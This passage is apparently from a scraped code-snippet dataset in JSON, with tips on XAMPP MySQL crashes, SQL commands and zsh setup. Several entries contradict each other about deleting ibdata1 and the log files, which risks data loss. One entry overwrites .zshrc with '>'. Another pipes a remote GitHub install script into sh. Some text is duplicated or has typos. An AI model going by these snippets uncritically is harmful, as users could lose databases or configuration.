    "description": "STOP! Please do NOT delete ibdata1 file!  Deleting this file is like playing a Russian roulette with your databases, it could work and restablish everything, but also, probably could leave unusable every database you have.  Instead, first try using the MySQL backup folder which is included with XAMPP. So do the next:  Rename the folder mysql/data to mysql/data_old (you can use any name) Create a new folder mysql/data Copy the content that resides in mysql/backup to the new mysql/data folder Copy all your database folders that are in mysql/data_old to mysql/data (skipping the mysql, performance_schema, and phpmyadmin folders from data_old) Finally copy the ibdata1 file from mysql/data_old and replace it inside mysql/data folder Start MySQL from XAMPP control panel And, voil&agrave;!\nSo, before deleting files, first try to do what the error message in XAMPP  message panel recommend you to do, using the MySQL backup folder which is  included with XAMPP. So do the next:  Rename the folder mysql/data to mysql/data_old (you can use any name)  Create a new folder mysql/data  Copy the content that resides in mysql/backup to the new mysql/data folder  Copy all your database folders that are in mysql/data_old to mysql/data  (skipping the mysql, performance_schema, and phpmyadmin folders from data_old)  Finally copy the ibdata1 file from mysql/data_old and replace it inside  mysql/data folder  Start MySQL from XAMPP control panel  And, voil&agrave;. No databases lost, no ports changed, no run as administrator,  no force recovery, no kill mysqld process, no restoring from previous versions, no more errors.\n1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1 file 3. restart the XAMPP server  or  1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1, ib_logfile0,ib_logfile1,ib_logfile101 files 3. restart the XAMPP server  or  Try to check the error log at the installed location: /xampp/mysql/data/mysql_error.log This can help you better debug the problem. Also Note:  1. XAMPP might hit into port issue when you have skype also running. 2. There is a federated plugin issue that is common.\n1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1 file 3. restart the XAMPP server  or  1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1, ib_logfile0,ib_logfile1,ib_logfile101 files 3. restart the XAMPP server  or  Try to check the error log at the installed location: /xampp/mysql/data/mysql_error.log\n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4739,
    "keyword": null,
    "link": null,
    "title": " xampp import sql file command line",
    "description": "C:\\xampp\\mysql\\bin>mysql -u {DB_USER} -p {DB_NAME} < path/to/file/ab.sql\n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4740,
    "keyword": null,
    "link": null,
    "title": " xampp mysql shutdown unexpectedly",
    "description": "STOP! Please do NOT delete ibdata1 file!  Deleting this file is like playing a Russian roulette with your databases, it could work and restablish everything, but also, probably could leave unusable every database you have.  Instead, first try using the MySQL backup folder which is included with XAMPP. So do the next:  Rename the folder mysql/data to mysql/data_old (you can use any name) Create a new folder mysql/data Copy the content that resides in mysql/backup to the new mysql/data folder Copy all your database folders that are in mysql/data_old to mysql/data (skipping the mysql, performance_schema, and phpmyadmin folders from data_old) Finally copy the ibdata1 file from mysql/data_old and replace it inside mysql/data folder Start MySQL from XAMPP control panel And, voil&agrave;!\n1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1 file 3. restart the XAMPP server  or  1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1, ib_logfile0,ib_logfile1,ib_logfile101 files 3. restart the XAMPP server  or  Try to check the error log at the installed location: /xampp/mysql/data/mysql_error.log This can help you better debug the problem. Also Note:  1. XAMPP might hit into port issue when you have skype also running. 2. There is a federated plugin issue that is common.\n1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1 file 3. restart the XAMPP server  or  1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1, ib_logfile0,ib_logfile1,ib_logfile101 files 3. restart the XAMPP server  or  Try to check the error log at the installed location: /xampp/mysql/data/mysql_error.log\n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4741,
    "keyword": null,
    "link": null,
    "title": " xampp mysql username and password",
    "description": "",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4742,
    "keyword": null,
    "link": null,
    "title": " xampp mysql version",
    "description": "mysql --version\n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4743,
    "keyword": null,
    "link": null,
    "title": " year sql server function",
    "description": "                                     YEAR(input_date) \n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4744,
    "keyword": null,
    "link": null,
    "title": " you are using safe update mode",
    "description": "SET SQL_SAFE_UPDATES = 0; \nUPDATE tablename SET columnname=1;\n",
    "reg_date": "2021-10-12T10:01:39.000Z"
  },
  {
    "id": 4745,
    "keyword": null,
    "link": null,
    "title": " zerar auto increment mysql",
    "description": "ALTER TABLE tabela AUTO_INCREMENT = 1\n",
    "reg_date": "2021-10-12T10:01:39.000Z"
  },
  {
    "id": 4746,
    "keyword": null,
    "link": null,
    "title": " zsh: command not found: mysq",
    "description": "echo 'export PATH=${PATH}:/usr/local/mysql/bin/' >.zshrc source ~/.zshrc \nvi ~/.zshrc                                 // open the zsh config and edite export PATH=${PATH}:/usr/local/mysql/bin/   // to add these words source ~/.zshrc                            // make it work\n/usr/local/mysql/bin\n",
    "reg_date": "2021-10-12T10:01:39.000Z"
  },
  {
    "id": 4747,
    "keyword": null,
    "link": null,
    "title": " zsh: command not found: mysql mamp",
    "description": "Add mysql path to executable path # echo 'export PATH=$PATH:/Applications/MAMP/Library/bin' >> ~/.bash_profile\n",
    "reg_date": "2021-10-12T10:01:39.000Z"
  },
  {
    "id": 4748,
    "keyword": null,
    "link": null,
    "title": " zsh-syntax-highlighting zsh-autosuggestions",
    "description": "# install ohmyzsh sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"  # clone repo git clone https://github.com/zsh-users/zsh-autosuggestions.git $ZSH_CUSTOM/plugins/zsh-autosuggestions && it clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting  # change ~/.zshrc plugins=(git zsh-autosuggestions zsh-syntax-highlighting)\n",
    "reg_date": "2021-10-12T10:01:39.000Z"
  }
]